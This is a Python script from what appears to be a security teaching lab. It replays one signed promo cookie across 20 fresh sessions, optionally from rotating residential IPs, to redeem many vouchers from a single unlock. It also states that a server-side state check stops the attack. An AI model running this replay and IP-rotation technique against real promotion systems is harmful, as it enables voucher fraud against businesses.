"""
Chapter 5, Round 1 attack: solve once, replay forever.

The promo "unlocked" flag rides in a signed cookie. A signature proves the server wrote it
once, not that it is the latest copy. So:

  1. Unlock the quiz one time and snapshot the `promo` cookie.
  2. Decode it with no key (it is base64 + a signature, not encrypted) to read the flag.
  3. Replay that one golden cookie from 20 fresh sessions.

  --share   replay the same cookie from 20 different residential IPs: one farm worker solves,
            the rest spend. Session sharing, the same bug seen from a botnet.

Expected:
  level 0 (no defense)   20/20 vouchers from one unlock (and --share: 20/20)
  level 1 (promo_state)  0/20: the server consumes the unlock once; a replayed cookie has no
                         server-side state behind it (promo_state:promo_not_unlocked)

    python attacks/round1_cookie_replay.py
"""

import argparse
from collections import Counter
import os
import sys

sys.path.insert(0, os.path.join(os.path.dirname(os.path.abspath(__file__)), "..", "tools"))
import promokit as pk  # noqa: E402  (labclient's localhost guard runs on import)
from labclient import world_pool  # noqa: E402

ATTEMPTS = 20


def run(share=False):
    seed = pk.new_client("bot:r1_seed")
    pk.land_and_unlock(seed)
    golden = seed.http.cookies.get("promo")
    leaked = pk.decode_cookie(golden)
    print(f"[decoded promo cookie, no key needed] {leaked}", file=sys.stderr)

    ips = world_pool("resi_us") if share else [None] * ATTEMPTS
    name = "r1_replay_share" if share else "r1_replay"
    sig, succeeded = Counter(), 0
    for i in range(ATTEMPTS):
        c = pk.new_client(f"bot:{name}", ip=ips[i % len(ips)])     # a fresh session each time
        c.set_cookie("promo", golden)                               # carry only the solved cookie
        r = pk.redeem(c)
        if r.status_code == 200 and "voucher" in r.text:
            succeeded += 1
        pk.tally(c, sig)
    return pk.report(name, ATTEMPTS, succeeded, signals=sig, leaked=leaked)


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--share", action="store_true", help="replay from many residential IPs (session sharing)")
    run(**vars(ap.parse_args()))
